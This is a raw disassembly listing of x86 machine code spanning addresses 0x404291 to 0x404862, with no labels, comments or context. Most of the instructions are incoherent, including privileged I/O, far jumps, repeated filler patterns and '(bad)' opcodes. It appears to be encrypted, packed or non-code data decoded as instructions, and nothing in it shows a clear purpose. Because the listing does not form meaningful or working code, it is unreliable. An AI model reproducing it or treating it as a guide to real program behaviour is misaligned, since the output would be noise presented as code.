  404291:	5c                   	pop    %esp
  404292:	a2 60 a0 e3 63       	mov    %al,0x63e3a060
  404297:	64 23 26             	and    %fs:(%esi),%esp
  40429a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40429b:	ad                   	lods   %ds:(%esi),%eax
  40429c:	15 4e 8b 74 29       	adc    $0x29748b4e,%eax
  4042a1:	38 2b                	cmp    %ch,(%ebx)
  4042a3:	76 29                	jbe    0x4042ce
  4042a5:	59                   	pop    %ecx
  4042a6:	88 d6                	mov    %dl,%dh
  4042a8:	a2 60 a0 e3 63       	mov    %al,0x63e3a060
  4042ad:	64 23 26             	and    %fs:(%esi),%esp
  4042b0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4042b1:	ad                   	lods   %ds:(%esi),%eax
  4042b2:	15 4c fd bf fe       	adc    $0xfebffd4c,%eax
  4042b7:	bb 62 64 a0 23       	mov    $0x23a06462,%ebx
  4042bc:	30 10                	xor    %dl,(%eax)
  4042be:	b0 49                	mov    $0x49,%al
  4042c0:	fd                   	std
  4042c1:	44                   	inc    %esp
  4042c2:	9f                   	lahf
  4042c3:	5f                   	pop    %edi
  4042c4:	63 c6                	arpl   %eax,%esi
  4042c6:	2b 60 06             	sub    0x6(%eax),%esp
  4042c9:	e3 88                	jecxz  0x404253
  4042cb:	62 12                	bound  %edx,(%edx)
  4042cd:	6b 06 e3             	imul   $0xffffffe3,(%esi),%eax
  4042d0:	88 68 14             	mov    %ch,0x14(%eax)
  4042d3:	65 88 44 9f 5f       	mov    %al,%gs:0x5f(%edi,%ebx,4)
  4042d8:	9f                   	lahf
  4042d9:	23 2d a0 a0 1a 64    	and    0x641aa0a0,%ebp
  4042df:	15 e0 60 d3 20       	adc    $0x20d360e0,%eax
  4042e4:	67 64 22 94 ce a0    	and    %fs:-0x5f32(%si),%dl
  4042ea:	a0 a0 23 58 cb       	mov    0xcb5823a0,%al
  4042ef:	d5 93                	aad    $0x93
  4042f1:	18 dc                	sbb    %bl,%ah
  4042f3:	8e e0                	mov    %eax,%fs
  4042f5:	60                   	pusha
  4042f6:	43                   	inc    %ebx
  4042f7:	24 55                	and    $0x55,%al
  4042f9:	a0 a0 23 30 5f       	mov    0x5f3023a0,%al
  4042fe:	c5 24 55 a0 a0 23 30 	lds    0x3023a0a0(,%edx,2),%esp
  404305:	5f                   	pop    %edi
  404306:	c5 28                	lds    (%eax),%ebp
  404308:	55                   	push   %ebp
  404309:	a0 a0 23 30 b0       	mov    0xb03023a0,%al
  40430e:	88 4a 9f             	mov    %cl,-0x61(%edx)
  404311:	5f                   	pop    %edi
  404312:	9f                   	lahf
  404313:	b8 63 10 b1 49       	mov    $0x49b11063,%eax
  404318:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404319:	44                   	inc    %esp
  40431a:	9f                   	lahf
  40431b:	5f                   	pop    %edi
  40431c:	63 e5                	arpl   %esp,%ebp
  40431e:	60                   	pusha
  40431f:	d4 a3                	aam    $0xa3
  404321:	eb e0                	jmp    0x404303
  404323:	5c                   	pop    %esp
  404324:	63 48 93             	arpl   %ecx,-0x6d(%eax)
  404327:	5f                   	pop    %edi
  404328:	9f                   	lahf
  404329:	5f                   	pop    %edi
  40432a:	e8 23 30 b5 2b       	call   0x2bf57352
  40432f:	4c                   	dec    %esp
  404330:	9f                   	lahf
  404331:	d5 a8                	aad    $0xa8
  404333:	48                   	dec    %eax
  404334:	31 5e 9f             	xor    %ebx,-0x61(%esi)
  404337:	5f                   	pop    %edi
  404338:	fd                   	std
  404339:	22 a4 60 30 49 1b 5c 	and    0x5c1b4930(%eax,%eiz,2),%ah
  404340:	9f                   	lahf
  404341:	5f                   	pop    %edi
  404342:	63 eb                	arpl   %ebp,%ebx
  404344:	60                   	pusha
  404345:	48                   	dec    %eax
  404346:	3b 61 a0             	cmp    -0x60(%ecx),%esp
  404349:	60                   	pusha
  40434a:	63 eb                	arpl   %ebp,%ebx
  40434c:	60                   	pusha
  40434d:	b5 2b                	mov    $0x2b,%ch
  40434f:	4c                   	dec    %esp
  404350:	23 24 80             	and    (%eax,%eax,4),%esp
  404353:	b3 f6                	mov    $0xf6,%bl
  404355:	b7 29                	mov    $0x29,%bh
  404357:	ad                   	lods   %ds:(%esi),%eax
  404358:	98                   	cwtl
  404359:	eb 92                	jmp    0x4042ed
  40435b:	e9 e5 5c 2b bd       	jmp    0xbd6ba045
  404360:	9c                   	pushf
  404361:	eb bb                	jmp    0x40431e
  404363:	eb e5                	jmp    0x40434a
  404365:	68 2b 98 25 5f       	push   $0x5f25982b
  40436a:	1f                   	pop    %ds
  40436b:	7a 25                	jp     0x404392
  40436d:	5f                   	pop    %edi
  40436e:	1d 67 50 64 88       	sbb    $0x88645067,%eax
  404373:	0a 83 5f 9f eb e5    	or     -0x1a1460a1(%ebx),%al
  404379:	5c                   	pop    %esp
  40437a:	2b 36                	sub    (%esi),%esi
  40437c:	88 24 9f             	mov    %ah,(%edi,%ebx,4)
  40437f:	5f                   	pop    %edi
  404380:	9f                   	lahf
  404381:	49                   	dec    %ecx
  404382:	ea 61 a0 60 d3 20 29 	ljmp   $0x2920,$0xd360a061
  404389:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40438a:	90                   	nop
  40438b:	e5 7b                	in     $0x7b,%eax
  40438d:	d4 ab                	aam    $0xab
  40438f:	e3 8b                	jecxz  0x40431c
  404391:	64 2b 63 29          	sub    %fs:0x29(%ebx),%esp
  404395:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404396:	90                   	nop
  404397:	e3 8b                	jecxz  0x404324
  404399:	64 d3 20             	shll   %cl,%fs:(%eax)
  40439c:	2a a6 a1 61 66 eb    	sub    -0x14999e5f(%esi),%ah
  4043a2:	66 eb f0             	data16 jmp 0x404395
  4043a5:	62 29                	bound  %ebp,(%ecx)
  4043a7:	b5 88                	mov    $0x88,%ch
  4043a9:	eb f0                	jmp    0x40439b
  4043ab:	66 25 32 14          	and    $0x1432,%ax
  4043af:	64 2b 92 8b 62 d3 56 	sub    %fs:0x56d3628b(%edx),%edx
  4043b6:	2b 27                	sub    (%edi),%esp
  4043b8:	97                   	xchg   %eax,%edi
  4043b9:	cd 88                	int    $0x88
  4043bb:	e9 e5 44 2b a5       	jmp    0xa56b88a5
  4043c0:	84 f9                	test   %bh,%cl
  4043c2:	97                   	xchg   %eax,%edi
  4043c3:	5f                   	pop    %edi
  4043c4:	db a5 88 d4 a7 10    	(bad) 0x10a7d488(%ebp)
  4043ca:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4043cb:	48                   	dec    %eax
  4043cc:	f1                   	int1
  4043cd:	43                   	inc    %ebx
  4043ce:	9f                   	lahf
  4043cf:	5f                   	pop    %edi
  4043d0:	23 a5 84 68 25 3b    	and    0x3b256884(%ebp),%esp
  4043d6:	14 65                	adc    $0x65,%al
  4043d8:	23 9b a1 d5 d5 e9    	and    -0x162a2a5f(%ebx),%ebx
  4043de:	fd                   	std
  4043df:	40                   	inc    %eax
  4043e0:	db dd                	fcmovnu %st(5),%st
  4043e2:	90                   	nop
  4043e3:	dd bd e5 96 d4 b9    	fnstsw -0x462b691b(%ebp)
  4043e9:	eb 63                	jmp    0x40444e
  4043eb:	e3 60                	jecxz  0x40444d
  4043ed:	68 2b 37 af 0f       	push   $0xfaf372b
  4043f2:	f5                   	cmc
  4043f3:	48                   	dec    %eax
  4043f4:	a3 22 2b ad 90       	mov    %eax,0x90ad2b22
  4043f9:	8b 6f eb             	mov    -0x15(%edi),%ebp
  4043fc:	76 48                	jbe    0x404446
  4043fe:	db 5f 9f             	fistpl -0x61(%edi)
  404401:	5f                   	pop    %edi
  404402:	2d a5 80 eb f5       	sub    $0xf5eb80a5,%eax
  404407:	44                   	inc    %esp
  404408:	88 cc                	mov    %cl,%ah
  40440a:	82 5f 9f eb          	sbbb   $0xeb,-0x61(%edi)
  40440e:	fd                   	std
  40440f:	40                   	inc    %eax
  404410:	8b be 9f 6b 2b a5    	mov    -0x5ad49461(%esi),%edi
  404416:	84 48 cd             	test   %cl,-0x33(%eax)
  404419:	42                   	inc    %edx
  40441a:	9f                   	lahf
  40441b:	5f                   	pop    %edi
  40441c:	2b 38                	sub    (%eax),%edi
  40441e:	2b a5 90 e9 e5 4c    	sub    0x4ce5e990(%ebp),%esp
  404424:	db dd                	fcmovnu %st(5),%st
  404426:	8c dd                	mov    %ds,%ebp
  404428:	a3 e9 1d 4c 25       	mov    %eax,0x254c1de9
  40442d:	56                   	push   %esi
  40442e:	14 8a                	adc    $0x8a,%al
  404430:	2b b5 8c 6f 4f b5    	sub    -0x4ab09074(%ebp),%esi
  404436:	88 eb                	mov    %ch,%bl
  404438:	63 e3                	arpl   %esp,%ebx
  40443a:	60                   	pusha
  40443b:	68 d3 29 88 a2       	push   $0xa28829d3
  404440:	8a 5f 9f             	mov    -0x61(%edi),%bl
  404443:	eb e5                	jmp    0x40442a
  404445:	4c                   	dec    %esp
  404446:	f0 eb f5             	lock jmp 0x40443e
  404449:	5c                   	pop    %esp
  40444a:	2b 72 2b             	sub    0x2b(%edx),%esi
  40444d:	23 23                	and    (%ebx),%esp
  40444f:	20 a8 eb 6e 48 75    	and    %ch,0x75486eeb(%eax)
  404455:	5e                   	pop    %esi
  404456:	9f                   	lahf
  404457:	5f                   	pop    %edi
  404458:	8b 76 2b             	mov    0x2b(%esi),%esi
  40445b:	ad                   	lods   %ds:(%esi),%eax
  40445c:	8c 6f 4f             	mov    %gs,0x4f(%edi)
  40445f:	ad                   	lods   %ds:(%esi),%eax
  404460:	88 eb                	mov    %ch,%bl
  404462:	73 e3                	jae    0x404447
  404464:	62 68 2b             	bound  %ebp,0x2b(%eax)
  404467:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404468:	9c                   	pushf
  404469:	eb a0                	jmp    0x40440b
  40446b:	48                   	dec    %eax
  40446c:	c5 43 9f             	lds    -0x61(%ebx),%eax
  40446f:	5f                   	pop    %edi
  404470:	67 63 a1 60 a0       	arpl   %esp,-0x5fa0(%bx,%di)
  404475:	60                   	pusha
  404476:	23 23                	and    (%ebx),%esp
  404478:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404479:	e9 db e3 63 64       	jmp    0x64a42859
  40447e:	2b 37                	sub    (%edi),%esi
  404480:	cb                   	lret
  404481:	b5 90                	mov    $0x90,%ch
  404483:	6f                   	outsl  %ds:(%esi),(%dx)
  404484:	4f                   	dec    %edi
  404485:	b5 88                	mov    $0x88,%ch
  404487:	eb e5                	jmp    0x40446e
  404489:	48                   	dec    %eax
  40448a:	af                   	scas   %es:(%edi),%eax
  40448b:	0f e5 50 a3          	pmulhw -0x5d(%eax),%mm2
  40448f:	23 d3                	and    %ebx,%edx
  404491:	29 88 4e 89 5f 9f    	sub    %ecx,-0x60a076b2(%eax)
  404497:	e3 1d                	jecxz  0x4044b6
  404499:	58                   	pop    %eax
  40449a:	a1 de ce e3 e5       	mov    0xe5e3cede,%eax
  40449f:	68 a4 5f ed 58       	push   $0x58ed5fa4
  4044a4:	ef                   	out    %eax,(%dx)
  4044a5:	e5 9f                	in     $0x9f,%eax
  4044a7:	dc c2                	fadd   %st,%st(2)
  4044a9:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4044aa:	67 a5                	movsl  %ds:(%si),%es:(%di)
  4044ac:	94                   	xchg   %eax,%esp
  4044ad:	60                   	pusha
  4044ae:	a0 60 a0 eb e5       	mov    0xe5eba060,%al
  4044b3:	68 f0 eb e5 54       	push   $0x54e5ebf0
  4044b8:	2d 64 23 eb ed       	sub    $0xedeb2364,%eax
  4044bd:	58                   	pop    %eax
  4044be:	2b 36                	sub    (%esi),%esi
  4044c0:	88 e8                	mov    %ch,%al
  4044c2:	9e                   	sahf
  4044c3:	5f                   	pop    %edi
  4044c4:	9f                   	lahf
  4044c5:	5f                   	pop    %edi
  4044c6:	e5 54                	in     $0x54,%eax
  4044c8:	ef                   	out    %eax,(%dx)
  4044c9:	d5 86                	aad    $0x86
  4044cb:	eb e5                	jmp    0x4044b2
  4044cd:	5c                   	pop    %esp
  4044ce:	29 78 ff             	sub    %edi,-0x1(%eax)
  4044d1:	be fb eb 85 bd       	mov    $0xbd85ebfb,%esi
  4044d6:	62 64 a0 b4          	bound  %esp,-0x4c(%eax,%eiz,4)
  4044da:	23 64 c4 64          	and    0x64(%esp,%eax,8),%esp
  4044de:	88 ca                	mov    %cl,%dl
  4044e0:	9e                   	sahf
  4044e1:	5f                   	pop    %edi
  4044e2:	9f                   	lahf
  4044e3:	23 30                	and    (%eax),%esi
  4044e5:	eb a8                	jmp    0x40448f
  4044e7:	e5 69                	in     $0x69,%eax
  4044e9:	d4 d2                	aam    $0xd2
  4044eb:	27                   	daa
  4044ec:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4044f1:	5f                   	pop    %edi
  4044f2:	e9 58 15 87 f0       	jmp    0xf0c75a4f
  4044f7:	e9 68 91 69 ea       	jmp    0xeaa9d664
  4044fc:	ea 61 2b b4 b1 66 25 	ljmp   $0x2566,$0xb1b42b61
  404503:	32 14 6e             	xor    (%esi,%ebp,2),%dl
  404506:	2b a8 9c e5 69 d4    	sub    -0x2b961a64(%eax),%ebp
  40450c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40450d:	eb b2                	jmp    0x4044c1
  40450f:	48                   	dec    %eax
  404510:	49                   	dec    %ecx
  404511:	5a                   	pop    %edx
  404512:	9f                   	lahf
  404513:	5f                   	pop    %edi
  404514:	23 48 a8             	and    -0x58(%eax),%ecx
  404517:	48                   	dec    %eax
  404518:	e5 41                	in     $0x41,%eax
  40451a:	9f                   	lahf
  40451b:	5f                   	pop    %edi
  40451c:	f8                   	clc
  40451d:	23 2d a0 a0 b3 2b    	and    0x2bb3a0a0,%ebp
  404523:	78 25                	js     0x40454a
  404525:	32 14 63             	xor    (%ebx,%eiz,2),%dl
  404528:	9f                   	lahf
  404529:	a2 98 e5 7b d4       	mov    %al,0xd47be598
  40452e:	b3 5f                	mov    $0x5f,%bl
  404530:	eb 58                	jmp    0x40458a
  404532:	15 6e f0 b2 29       	adc    $0x29b2f06e,%eax
  404537:	2a 9f a3 98 48 45    	sub    0x454898a3(%edi),%bl
  40453d:	5f                   	pop    %edi
  40453e:	9f                   	lahf
  40453f:	5f                   	pop    %edi
  404540:	fa                   	cli
  404541:	b8 29 70 fb 23       	mov    $0x23fb7029,%eax
  404546:	2d a0 a0 eb b5       	sub    $0xb5eba0a0,%eax
  40454b:	80 40 a0 a0          	addb   $0xa0,-0x60(%eax)
  40454f:	e9 b0 03 c0 00       	jmp    0x1004904
  404554:	e0 60                	loopne 0x4045b6
  404556:	63 eb                	arpl   %ebp,%ebx
  404558:	60                   	pusha
  404559:	b3 f6                	mov    $0xf6,%bl
  40455b:	eb 90                	jmp    0x4044ed
  40455d:	eb bd                	jmp    0x40451c
  40455f:	84 40 a0             	test   %al,-0x60(%eax)
  404562:	a0 e5 7b d4 ac       	mov    0xacd47be5,%al
  404567:	eb e6                	jmp    0x40454f
  404569:	64 9f                	fs lahf
  40456b:	b3 a4                	mov    $0xa4,%bl
  40456d:	eb bb                	jmp    0x40452a
  40456f:	e5 7b                	in     $0x7b,%eax
  404571:	d5 94                	aad    $0x94
  404573:	be fb 23 2d a0       	mov    $0xa02d23fb,%esi
  404578:	a0 eb b0 e5 72       	mov    0x72e5b0eb,%al
  40457d:	d4 ae                	aam    $0xae
  40457f:	27                   	daa
  404580:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  404585:	b0 f2                	mov    $0xf2,%al
  404587:	eb a2                	jmp    0x40452b
  404589:	5f                   	pop    %edi
  40458a:	f0 68 f8 23 2d a0    	lock push $0xa02d23f8
  404590:	a0 e5 72 d4 b9       	mov    0xb9d472e5,%al
  404595:	b2 f0                	mov    $0xf0,%dl
  404597:	eb a2                	jmp    0x40453b
  404599:	b2 9f                	mov    $0x9f,%dl
  40459b:	b0 a4                	mov    $0xa4,%al
  40459d:	b8 2b 68 2f 60       	mov    $0x602f682b,%eax
  4045a2:	25 29 15 61 63       	and    $0x63611529,%eax
  4045a7:	eb a1                	jmp    0x40454a
  4045a9:	b1 9f                	mov    $0x9f,%cl
  4045ab:	b0 a8                	mov    $0xa8,%al
  4045ad:	23 2b                	and    (%ebx),%ebp
  4045af:	68 25 29 29 70       	push   $0x70292925
  4045b4:	14 66                	adc    $0x66,%al
  4045b6:	2b 61 f1             	sub    -0xf(%ecx),%esp
  4045b9:	5f                   	pop    %edi
  4045ba:	f0 68 63 b5 2b 4c    	lock push $0x4c2bb563
  4045c0:	d3 20                	shll   %cl,(%eax)
  4045c2:	f5                   	cmc
  4045c3:	c8 07 91 e0          	enter  $0x9107,$0xe0
  4045c7:	60                   	pusha
  4045c8:	04 5f                	add    $0x5f,%al
  4045ca:	d0 c4                	rol    $1,%ah
  4045cc:	29 80 9f 65 30 15    	sub    %eax,0x1530659f(%eax)
  4045d2:	e0 60                	loopne 0x404634
  4045d4:	15 6c 9f 75 34       	adc    $0x34759f6c,%eax
  4045d9:	00 e0                	add    %ah,%al
  4045db:	60                   	pusha
  4045dc:	9f                   	lahf
  4045dd:	75 e0                	jne    0x4045bf
  4045df:	00 e0                	add    %ah,%al
  4045e1:	60                   	pusha
  4045e2:	d3 20                	shll   %cl,(%eax)
  4045e4:	fa                   	cli
  4045e5:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  4045ea:	08 ce                	or     %cl,%dh
  4045ec:	d1 a0 a0 23 89 28    	shll   $1,0x288923a0(%eax)
  4045f2:	8e 5f 9f             	mov    -0x61(%edi),%ds
  4045f5:	4b                   	dec    %ebx
  4045f6:	98                   	cwtl
  4045f7:	bd 63 e3 cd f0       	mov    $0xf0cde363,%ebp
  4045fc:	55                   	push   %ebp
  4045fd:	a0 a0 61 13 9e       	mov    0x9e1361a0,%al
  404602:	88 42 7e             	mov    %al,0x7e(%edx)
  404605:	5f                   	pop    %edi
  404606:	9f                   	lahf
  404607:	03 34 15 e0 60 67 65 	add    0x656760e0(,%edx,1),%esi
  40460e:	a0 10 e0 60 2c       	mov    0x2c60e010,%al
  404613:	8e e0                	mov    %eax,%fs
  404615:	60                   	pusha
  404616:	06                   	push   %es
  404617:	27                   	daa
  404618:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404619:	90                   	nop
  40461a:	50                   	push   %eax
  40461b:	a0 a0 10 77 c6       	mov    0xc67710a0,%al
  404620:	67 65 9c             	addr16 gs pushf
  404623:	11 e0                	adc    %esp,%eax
  404625:	60                   	pusha
  404626:	50                   	push   %eax
  404627:	37                   	aaa
  404628:	06                   	push   %es
  404629:	27                   	daa
  40462a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40462b:	28 53 a0             	sub    %dl,-0x60(%ebx)
  40462e:	a0 10 77 48 47       	mov    0x47487710,%al
  404633:	5c                   	pop    %esp
  404634:	9f                   	lahf
  404635:	5f                   	pop    %edi
  404636:	88 16                	mov    %dl,(%esi)
  404638:	7f 5f                	jg     0x404699
  40463a:	9f                   	lahf
  40463b:	03 c0                	add    %eax,%eax
  40463d:	10 e0                	adc    %ah,%al
  40463f:	60                   	pusha
  404640:	63 5f 9f             	arpl   %ebx,-0x61(%edi)
  404643:	5f                   	pop    %edi
  404644:	9f                   	lahf
  404645:	8f                   	(bad)
  404646:	a0 60 a0 80 c0       	mov    0xc080a060,%al
  40464b:	80 c0 80             	add    $0x80,%al
  40464e:	c0 80 c0 80 c0 80 c0 	rolb   $0xc0,-0x7f3f7f40(%eax)
  404655:	80 c0 80             	add    $0x80,%al
  404658:	c0 80 c0 80 c0 80 c0 	rolb   $0xc0,-0x7f3f7f40(%eax)
  40465f:	80 c0 80             	add    $0x80,%al
  404662:	c0 80 c0 80 c0 80 c0 	rolb   $0xc0,-0x7f3f7f40(%eax)
  404669:	80 c0 80             	add    $0x80,%al
  40466c:	c0 80 c0 80 c0 80 c0 	rolb   $0xc0,-0x7f3f7f40(%eax)
  404673:	80 c0 80             	add    $0x80,%al
  404676:	c0 80 a0 b0 0a a0 88 	rolb   $0x88,-0x5ff54f60(%eax)
  40467d:	f8                   	clc
  40467e:	7e 5f                	jle    0x4046df
  404680:	9f                   	lahf
  404681:	23 2d a0 a0 18 a8    	and    0xa818a0a0,%ebp
  404687:	60                   	pusha
  404688:	a0 60 63 eb 60       	mov    0x60eb6360,%al
  40468d:	b3 88                	mov    $0x88,%bl
  40468f:	52                   	push   %edx
  404690:	9f                   	lahf
  404691:	5f                   	pop    %edi
  404692:	9f                   	lahf
  404693:	eb 78                	jmp    0x40470d
  404695:	e5 7b                	in     $0x7b,%eax
  404697:	d4 d6                	aam    $0xd6
  404699:	e3 dd                	jecxz  0x404678
  40469b:	fc                   	cld
  40469c:	40                   	inc    %eax
  40469d:	a0 a0 5f 15 6a       	mov    0x6a155fa0,%al
  4046a2:	58                   	pop    %eax
  4046a3:	42                   	inc    %edx
  4046a4:	a0 60 a0 48 61       	mov    0x6148a060,%al
  4046a9:	52                   	push   %edx
  4046aa:	9f                   	lahf
  4046ab:	5f                   	pop    %edi
  4046ac:	2b 23                	sub    (%ebx),%esp
  4046ae:	88 26                	mov    %ah,(%esi)
  4046b0:	9f                   	lahf
  4046b1:	5f                   	pop    %edi
  4046b2:	9f                   	lahf
  4046b3:	e5 60                	in     $0x60,%eax
  4046b5:	d5 ac                	aad    $0xac
  4046b7:	18 82 60 a0 60 88    	sbb    %al,-0x779f5fa0(%edx)
  4046bd:	0c 92                	or     $0x92,%al
  4046bf:	5f                   	pop    %edi
  4046c0:	9f                   	lahf
  4046c1:	4b                   	dec    %ebx
  4046c2:	ac                   	lods   %ds:(%esi),%al
  4046c3:	b0 41                	mov    $0x41,%al
  4046c5:	fc                   	cld
  4046c6:	40                   	inc    %eax
  4046c7:	a0 a0 b0 88 d2       	mov    0xd288b0a0,%al
  4046cc:	7e 5f                	jle    0x40472d
  4046ce:	9f                   	lahf
  4046cf:	bb 63 18 a8 60       	mov    $0x60a81863,%ebx
  4046d4:	a0 60 25 20 14       	mov    0x14202560,%al
  4046d9:	7f 88                	jg     0x404663
  4046db:	aa                   	stos   %al,%es:(%edi)
  4046dc:	7e 5f                	jle    0x40473d
  4046de:	9f                   	lahf
  4046df:	03 3c 00             	add    (%eax,%eax,1),%edi
  4046e2:	e0 60                	loopne 0x404744
  4046e4:	88 04 9f             	mov    %al,(%edi,%ebx,4)
  4046e7:	5f                   	pop    %edi
  4046e8:	9f                   	lahf
  4046e9:	01 3c 00             	add    %edi,(%eax,%eax,1)
  4046ec:	e0 60                	loopne 0x40474e
  4046ee:	f0 48                	lock dec %eax
  4046f0:	e5 3e                	in     $0x3e,%eax
  4046f2:	9f                   	lahf
  4046f3:	5f                   	pop    %edi
  4046f4:	43                   	inc    %ebx
  4046f5:	e0 56                	loopne 0x40474d
  4046f7:	a0 a0 23 2d a0       	mov    0xa02d23a0,%al
  4046fc:	a0 18 a8 60 a0       	mov    0xa060a818,%al
  404701:	60                   	pusha
  404702:	25 20 14 7e 23       	and    $0x237e1420,%eax
  404707:	9d                   	popf
  404708:	3c 00                	cmp    $0x0,%al
  40470a:	e0 60                	loopne 0x40476c
  40470c:	9f                   	lahf
  40470d:	d4 b5                	aam    $0xb5
  40470f:	01 3c 00             	add    %edi,(%eax,%eax,1)
  404712:	e0 60                	loopne 0x404774
  404714:	f0 48                	lock dec %eax
  404716:	bf 3e 9f 5f 25       	mov    $0x255f9f3e,%edi
  40471b:	20 14 66             	and    %dl,(%esi,%eiz,2)
  40471e:	f0 48                	lock dec %eax
  404720:	9d                   	popf
  404721:	3d 9f 5f 63 18       	cmp    $0x18635f9f,%eax
  404726:	a8 60                	test   $0x60,%al
  404728:	a0 60 25 20 14       	mov    0x14202560,%al
  40472d:	79 88                	jns    0x4046b7
  40472f:	2a 9f 5f 9f e3 dd    	sub    -0x221c60a1(%edi),%bl
  404735:	fc                   	cld
  404736:	40                   	inc    %eax
  404737:	a0 a0 5f 14 6b       	mov    0x6b145fa0,%al
  40473c:	41                   	inc    %ecx
  40473d:	fc                   	cld
  40473e:	40                   	inc    %eax
  40473f:	a0 a0 b0 88 4a       	mov    0x4a88b0a0,%al
  404744:	7d 5f                	jge    0x4047a5
  404746:	9f                   	lahf
  404747:	23 30                	and    (%eax),%esi
  404749:	ea ad d0 56 a0 a0 01 	ljmp   $0x1a0,$0xa056d0ad
  404750:	3c 00                	cmp    $0x0,%al
  404752:	e0 60                	loopne 0x4047b4
  404754:	24 29                	and    $0x29,%al
  404756:	15 86 04 eb b5       	adc    $0xb5eb0486,%eax
  40475b:	8c a0 60 a0 eb a4    	mov    %fs,-0x5b145fa0(%eax)
  404761:	e2 63                	loop   0x4047c6
  404763:	48                   	dec    %eax
  404764:	c5 5f 9f             	lds    -0x61(%edi),%ebx
  404767:	5f                   	pop    %edi
  404768:	41                   	inc    %ecx
  404769:	fc                   	cld
  40476a:	40                   	inc    %eax
  40476b:	a0 a0 b0 88 26       	mov    0x2688b0a0,%al
  404770:	7d 5f                	jge    0x4047d1
  404772:	9f                   	lahf
  404773:	e5 60                	in     $0x60,%eax
  404775:	d4 a1                	aam    $0xa1
  404777:	23 41 e0             	and    -0x20(%ecx),%eax
  40477a:	56                   	push   %esi
  40477b:	a0 a0 23 f0 48       	mov    0x48f023a0,%al
  404780:	55                   	push   %ebp
  404781:	3d 9f 5f 25 20       	cmp    $0x20255f9f,%eax
  404786:	14 3b                	adc    $0x3b,%al
  404788:	63 18                	arpl   %ebx,(%eax)
  40478a:	40                   	inc    %eax
  40478b:	00 e0                	add    %ah,%al
  40478d:	60                   	pusha
  40478e:	88 16                	mov    %dl,(%esi)
  404790:	9d                   	popf
  404791:	5f                   	pop    %edi
  404792:	9f                   	lahf
  404793:	23 30                	and    (%eax),%esi
  404795:	1a 40 00             	sbb    0x0(%eax),%al
  404798:	e0 60                	loopne 0x4047fa
  40479a:	23 dd                	and    %ebp,%ebx
  40479c:	ac                   	lods   %ds:(%esi),%al
  40479d:	61                   	popa
  40479e:	15 8a f0 b2 66       	adc    $0x66b2f08a,%eax
  4047a3:	65 10 16             	adc    %dl,%gs:(%esi)
  4047a6:	e0 60                	loopne 0x404808
  4047a8:	a1 eb ed 68 29       	mov    0x2968edeb,%eax
  4047ad:	6d                   	insl   (%dx),%es:(%edi)
  4047ae:	14 16                	adc    $0x16,%al
  4047b0:	e0 60                	loopne 0x404812
  4047b2:	29 aa a4 27 e2 68    	sub    %ebp,0x68e227a4(%edx)
  4047b8:	a0 60 a0 60 67       	mov    0x6760a060,%al
  4047bd:	a2 ac 60 a0 60       	mov    %al,0x60a060ac
  4047c2:	a0 48 61 5f 9f       	mov    0x9f5f6148,%al
  4047c7:	5f                   	pop    %edi
  4047c8:	fa                   	cli
  4047c9:	b8 9f 95 18 16       	mov    $0x1618959f,%eax
  4047ce:	e0 60                	loopne 0x404830
  4047d0:	59                   	pop    %ecx
  4047d1:	18 40 a0             	sbb    %al,-0x60(%eax)
  4047d4:	a0 48 5f 4f 9f       	mov    0x9f4f5f48,%al
  4047d9:	5f                   	pop    %edi
  4047da:	63 eb                	arpl   %ebp,%ebx
  4047dc:	60                   	pusha
  4047dd:	b5 2b                	mov    $0x2b,%ch
  4047df:	4c                   	dec    %esp
  4047e0:	d3 20                	shll   %cl,(%eax)
  4047e2:	f5                   	cmc
  4047e3:	c8 25 93 e0          	enter  $0x9325,$0xe0
  4047e7:	60                   	pusha
  4047e8:	04 5f                	add    $0x5f,%al
  4047ea:	d0 c4                	rol    $1,%ah
  4047ec:	29 80 9f 65 1c 16    	sub    %eax,0x161c659f(%eax)
  4047f2:	e0 60                	loopne 0x404854
  4047f4:	15 6a 58 f8 40       	adc    $0x40f8586a,%eax
  4047f9:	a0 a0 48 19 51       	mov    0x511948a0,%al
  4047fe:	9f                   	lahf
  4047ff:	5f                   	pop    %edi
  404800:	d3 20                	shll   %cl,(%eax)
  404802:	fa                   	cli
  404803:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  404808:	08 ec                	or     %ch,%ah
  40480a:	d3 a0 a0 23 89 0a    	shll   %cl,0xa8923a0(%eax)
  404810:	8c 5f 9f             	mov    %ds,-0x61(%edi)
  404813:	4b                   	dec    %ebx
  404814:	98                   	cwtl
  404815:	bd 63 eb 60 e3       	mov    $0xe360eb63,%ebp
  40481a:	cd dc                	int    $0xdc
  40481c:	56                   	push   %esi
  40481d:	a0 a0 61 63 b5       	mov    0xb56361a0,%al
  404822:	2b 4c d3 20          	sub    0x20(%ebx,%edx,8),%ecx
  404826:	f5                   	cmc
  404827:	c8 5d 93 e0          	enter  $0x935d,$0xe0
  40482b:	60                   	pusha
  40482c:	04 5f                	add    $0x5f,%al
  40482e:	d0 c4                	rol    $1,%ah
  404830:	29 80 9f 65 24 16    	sub    %eax,0x1624659f(%eax)
  404836:	e0 60                	loopne 0x404898
  404838:	d3 20                	shll   %cl,(%eax)
  40483a:	fa                   	cli
  40483b:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  404840:	08 24 d3             	or     %ah,(%ebx,%edx,8)
  404843:	a0 a0 23 89 d2       	mov    0xd28923a0,%al
  404848:	8c 5f 9f             	mov    %ds,-0x61(%edi)
  40484b:	4b                   	dec    %ebx
  40484c:	98                   	cwtl
  40484d:	bd 63 eb 60 e3       	mov    $0xe360eb63,%ebp
  404852:	cd e4                	int    $0xe4
  404854:	56                   	push   %esi
  404855:	a0 a0 61 63 5f       	mov    0x5f6361a0,%al
  40485a:	c5 c4 d1             	(bad)
  40485d:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  404862:	c5 c0 d1             	(bad)
